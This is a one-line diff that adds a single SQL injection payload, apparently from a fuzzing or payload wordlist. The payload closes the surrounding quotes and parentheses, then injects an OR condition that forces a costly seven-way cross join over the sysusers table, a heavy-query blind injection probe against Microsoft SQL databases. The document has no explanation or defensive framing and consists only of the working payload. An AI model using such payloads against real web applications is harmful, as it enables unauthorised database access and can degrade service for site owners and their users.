@@ -1,0 +1,1 @@
+1"))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((("abcw"="abcw
